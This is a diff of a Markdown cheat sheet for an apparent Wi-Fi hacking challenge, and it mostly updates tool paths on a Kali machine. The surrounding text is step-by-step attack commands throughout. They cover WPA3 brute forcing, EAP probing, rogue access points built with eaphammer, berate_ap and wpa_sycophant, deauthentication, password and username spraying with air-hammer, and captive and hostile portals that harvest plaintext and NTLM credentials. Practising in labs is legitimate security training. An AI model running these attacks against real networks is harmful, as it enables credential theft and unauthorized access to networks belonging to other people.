@@ -130,8 +130,7 @@
 
 ### Brute force
 - https://github.com/blunderbuss-wctf/wacker
-1. ```cd ~/tools```
-2. ```git clone https://github.com/blunderbuss-wctf/wacker```
+1. ```cd /home/kali/Downloads/wifi-tools/wacker```
 3. ``` ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462 ``` [ [frequency go search wifi channel x freq , ch10 = 2457](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
 4. prep wpa3sae.conf
    ```
@@ -188,19 +187,19 @@
 ### Check domain name of this AP
 - https://github.com/r4ulcl/wifi_db
 1. Choose channel to listen and dump pcap ``` airodump-ng wlan0mon -w ./scanc44 -c 44 --wps ```
-2. Go to the tool path ``` cd /root/tools/wifi_db ```
+2. ```cd /home/kali/Downloads/wifi-tools/wifi_db```
 3. choose the kasmite file name for last param ``` python3 wifi_db.py -d wifichallenge.SQLITE /home/user/newwifi/scanc44-01 ```
 4. Browse ``` sqlitebrowser wifichallenge.SQLITE ``` and go "browse data" tab, change table to IdentityAP
 
 ### Get email address of server cert
 - https://gist.github.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2
-1. ``` cd /root/tools/ ```
+1. ```cd /home/kali/Downloads/wifi-tools/pcap_filter```
 2. ``` bash pcapFilter.sh -f /home/user/newwifi/scanc44-01.cap -C ```
 3. Find Certificate: Subject --> last value
 
 ### Check EAP method 
 - https://github.com/blackarrowsec/EAP_buster
-1. ``` cd /root/tools/EAP_buster/ ```
+1. ``` cd /home/kali/Downloads/wifi-tools/EAP_buster/ ```
 2. using tool wifi_db to check users in this network (Table: IdentityAP)
    
    【OR] use the name found in there then ``` bash ./EAP_buster.sh $SSID 'GLOBAL\GlobalAdmin' wlan1 ```
@@ -208,7 +207,7 @@
 ## WPA 2 MGT - (Deauth attack) 
 - Attack and Crack Client password to login as that user 
 - ``` git clone https://github.com/s0lst1c3/eaphammer ```
-1. ``` cd /root/tools/eaphammer ```
+1. ``` cd /home/kali/Downloads/wifi-tools/eaphammer ```
 2. ``` python3 ./eaphammer --cert-wizard``` random fill something
 3. *** Start rogue AP ``` python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced ```
 4. Gather all possible AP BSSID instance of this ESSID
@@ -247,14 +246,14 @@
 
 ### Brute force password with known user name 
 - https://github.com/Wh1t3Rh1n0/air-hammer
-1. ``` cd  ~/tools/air-hammer ```
+1. ``` cd  /home/kali/Downloads/wifi-tools/air-hammer ```
 2. prepare user list ``` echo 'CONTOSO\test' > test.user ```
 3. GO FUCK!!! ``` ./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user ```
 
 ### Brute force username with know password
 - https://github.com/Wh1t3Rh1n0/air-hammer
 1. prepare domain tagged user list``` cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > ~/top-usernames-shortlist-contoso.txt ```
-2. ``` cd  ~/tools/air-hammer ```
+2. ``` cd  /home/kali/Downloads/wifi-tools/air-hammer ```
 3. GO FUCK!!! ``` ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt ```
 
 ## WPA 2 MGT - (relay attack) 
@@ -287,7 +286,10 @@
     }
    ```
 3. [Shell 1] Host rougue AP 
-   ``` ./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets ``` 
+   ``` 
+   cd /home/kali/Downloads/wifi-tools/berate_ap/
+   ./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
+    ``` 
 4. [In Parallel Shell 2] try deauth attack with -a = AP mac, -c = station (that connecting) mac
    ```
     iwconfig wlan0mon channel 44
@@ -295,6 +297,7 @@
    ```
 5. [In Parallel Shell 3] Relay attack
    ```
+   cd /home/kali/Downloads/wifi-tools/wpa_sycophant/
     ./wpa_sycophant.sh -c wpa2-mgt-fake.conf -i wlan3
    ```  
 6. [If failed]: change ```.conf``` file ``` phase1="peapver=1" ```
@@ -309,7 +312,7 @@
 - password will be plaintext
 1. Leverage eaphammer
    ```
-   cd ~/tools/eaphammer
+   cd /home/kali/Downloads/wifi-tools/eaphammer
    sudo killall dnsmasq
    ./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal
    ```
@@ -323,7 +326,7 @@
 - credential will be ntlm 
 1. Leverage eaphammer
    ```
-   cd ~/tools/eaphammer
+   cd /home/kali/Downloads/wifi-tools/eaphammer
    sudo killall dnsmasq
    ./eaphammer --essid WiFi-Restaurant --interface wlan4 --hostile-portal
    ```
@@ -345,11 +348,11 @@
 ### [Option 3] Deauth attack (req getting files from another AP web server but same Channel)
 1. Import cert from above
    ```
-   python3 /root/tools/eaphammer/eaphammer --cert-wizard import --server-cert ./server.crt --ca-cert ./ca.crt --private-key ./client.key --private-key-passwd xd12345
+   python3 /home/kali/Downloads/wifi-tools/eaphammer/eaphammer --cert-wizard import --server-cert ./server.crt --ca-cert ./ca.crt --private-key ./client.key --private-key-passwd xd12345
    ```
 2. Host Rogue AP
    ```
-   cd /root/tools/eaphammer
+   cd /home/kali/Downloads/wifi-tools/eaphammer
    python3 ./eaphammer -i wlan4 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
    ```
 3 [Shells] 
